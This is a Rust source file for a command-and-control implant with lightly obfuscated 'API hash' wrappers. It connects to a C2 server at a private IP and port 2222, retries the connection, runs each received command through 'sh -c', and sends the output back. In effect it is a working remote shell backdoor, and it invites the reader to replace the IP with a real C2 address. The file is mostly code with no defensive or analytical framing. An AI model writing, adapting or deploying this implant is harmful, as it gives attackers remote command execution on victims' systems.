use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::thread;
use std::time::Duration;
use std::collections::HashMap;

/// Obfuscated API Hash Table
fn api_hash_table() -> HashMap<&'static str, u64> {
    let mut hashes = HashMap::new();
    hashes.insert("recv", hash_api("recv"));
    hashes.insert("send", hash_api("send"));
    hashes.insert("exec_cmd", hash_api("exec_cmd"));
    hashes.insert("connect_c2", hash_api("connect_c2"));
    hashes
}

/// Simple API Hashing function
fn hash_api(api_name: &str) -> u64 {
    api_name.bytes().fold(0, |acc, b| acc.wrapping_mul(31).wrapping_add(u64::from(b)))
}

/// Hash-matching function
fn match_api(hash: u64) -> &'static str {
    let table = api_hash_table();
    table.iter().find(|&(_, &v)| v == hash).map(|(k, _)| *k).unwrap_or("unknown")
}

/// Function to handle obfuscated command execution
fn exec_cmd(command: &str) -> Result<String, std::io::Error> {
    let output = Command::new("sh")
        .arg("-c")
        .arg(command)
        .output()?;

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// Obfuscated connection logic to C2
fn connect_c2(server_ip: &str, server_port: u16) -> Option<TcpStream> {
    let mut attempt = 1;
    while attempt <= 3 {
        match TcpStream::connect((server_ip, server_port)) {
            Ok(stream) => return Some(stream),
            Err(_) => {
                eprintln!("Connection attempt {} failed. Retrying...", attempt);
                thread::sleep(Duration::from_secs(10));
                attempt += 1;
            }
        }
    }
    None
}

fn main() {
    // C2 Server Details
    let server_ip = "192.168.1.36";  // Replace with actual C2 server IP
    let server_port = 2222;           // Replace with desired port

    // API Function Hashes
    let send_hash = hash_api("send");
    let exec_cmd_hash = hash_api("exec_cmd");

    // Try to connect to the C2
    if let Some(mut stream) = connect_c2(server_ip, server_port) {
        println!("Connected to C2 server!");

        let mut buffer = [0; 1024];
        while let Ok(bytes_read) = stream.read(&mut buffer) {
            if bytes_read == 0 { break; }

            let command = String::from_utf8_lossy(&buffer[..bytes_read]);
            println!("Received command: {}", command);

            // Execute the received command if it matches the hashed API call
            if match_api(exec_cmd_hash) == "exec_cmd" {
                if let Ok(output) = exec_cmd(&command) {
                    // Send output back to C2
                    if match_api(send_hash) == "send" {
                        let _ = stream.write_all(output.as_bytes());
                    }
                } else {
                    // Send error message
                    let error_msg = "Error executing command".to_string();
                    let _ = stream.write_all(error_msg.as_bytes());
                }
            }
        }
    } else {
        eprintln!("Could not connect to C2 server after multiple attempts.");
    }
}

